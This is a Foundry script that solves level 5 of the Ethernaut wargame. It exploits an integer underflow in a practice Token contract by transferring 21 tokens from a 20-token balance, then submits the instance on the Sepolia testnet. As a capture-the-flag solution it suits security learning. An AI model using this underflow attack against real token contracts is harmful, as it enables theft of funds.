// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console2} from "forge-std/Script.sol";
import {Token} from "../src/Level05.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";

contract Level05 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Token instance = Token(vm.envAddress("LVL05_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console2.log("balanceOf caller: ", instance.balanceOf(caller));
        instance.transfer(address(instance), 21);
        console2.log("balanceOf caller: ", instance.balanceOf(caller));

        ethernaut.submitLevelInstance(address(instance));

        vm.stopBroadcast();
    }
}

// forge script script/Level05.s.sol --broadcast --rpc-url sepolia
